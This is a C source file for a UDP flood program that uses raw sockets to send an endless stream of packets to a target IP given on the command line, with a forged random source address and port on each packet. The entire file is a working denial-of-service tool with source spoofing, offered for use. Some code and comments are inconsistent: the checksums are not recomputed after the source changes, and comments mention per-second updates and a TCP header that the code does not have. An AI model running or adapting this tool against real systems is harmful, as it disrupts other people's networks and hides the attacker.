#include<stdio.h> 
#include<string.h> 
#include<sys/socket.h> 
#include<stdlib.h> 
#include<errno.h> 
#include<netinet/udp.h>   
#include<netinet/ip.h>    
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>

/* 
    96 bit (12 bytes) pseudo header needed for udp header checksum calculation 
*/
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};
 
/*
    Checksum calculation function
*/
unsigned short csum(unsigned short *ptr,int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}

/* 
    Generate a random IP
*/
char* rand_IP(char* ip)
{
    int randIP;
    time_t t;
    srand((unsigned) time(&t));
    int i = 0;
    char temp[10];

    // part 1 - XXX.
    randIP = rand() % 255;  
    sprintf(ip, "%d", randIP);
    strcat(ip, ".");

    //part 2 - XXX.XXX.
    randIP = rand() % 255;
    sprintf(temp, "%d", randIP);
    strcat(ip, temp);
    strcat(ip, "."); 

    // part 3 - XXX.XXX.XXX.
    randIP = rand() % 255;
    sprintf(temp, "%d", randIP);
    strcat(ip, temp);
    strcat(ip, "."); 

    // part 4 - XXX.XXX.XXX.XXX
    randIP = rand() % 255;
    sprintf(temp, "%d", randIP);
    strcat(ip, temp);

    return ip;
}

/*
    Generates a random port
*/
int rand_port(){
    int port = rand() % 6000;
    return port;
}

/*
    Directions on input
*/
void usage(){
    printf("Usage: ./udpflood <IP_ADDRESS_TO_TARGET>\n");
    exit(0);
}

 
int main ( int argc, char *argv[] )
{
    if( argc < 2 || argc > 2)   usage();
    char dest_ip[50]; //Keep destination IP array large just in case for long hostnames
    strcpy(dest_ip, argv[1]); 

    //Create a raw socket of type IPPROTO
    int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
     
    if(s == -1)
    {
        //socket creation failed, may be because of non-root privileges
        perror("Failed to create raw socket");
        exit(1);
    }
     
    //Datagram to represent the packet
    char datagram[4096] , source_ip[32] , *data , *pseudogram;
     
    //zero out the packet buffer
    memset (datagram, 0, 4096);
     
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;
     
    //UDP header
    struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));
     
    struct sockaddr_in sin;
    struct pseudo_header psh;
     
    //Data part
    data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
    strcpy(data , "ABCDEFGHIJKLMNOPQRSTUVWXYZ");
     
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr (dest_ip);
     
    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + strlen(data);
    iph->id = htonl (54321); //Id of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->daddr = sin.sin_addr.s_addr;
     
    //Ip checksum
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
     
    //UDP header
    udph->dest = htons (8622);
    udph->len = htons(8 + strlen(data)); //tcp header size
    udph->check = 0; //leave checksum 0 now, filled later by pseudo header
     
    //Now the UDP checksum using the pseudo header
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(sizeof(struct udphdr) + strlen(data) );
     
    int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
    pseudogram = malloc(psize);
     
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + strlen(data));
     
    udph->check = csum( (unsigned short*) pseudogram , psize);
     
    while (1)
    {
        rand_IP(source_ip); //New random IP every second
        iph->saddr = inet_addr ( source_ip ); //Update random IP
        psh.source_address = inet_addr( source_ip ); //Update random IP
        int port = rand_port(); //New random port every second
        udph->source = htons(port); //Update port

        //Send the packet
        if (sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
        {
            perror("sendto failed");
        }
        //Data send successfully
        else
        {
            printf("IP: %s, Port: %d\r", source_ip, port%6000);
            fflush(stdout);
        }
    }
     
    return 0;
}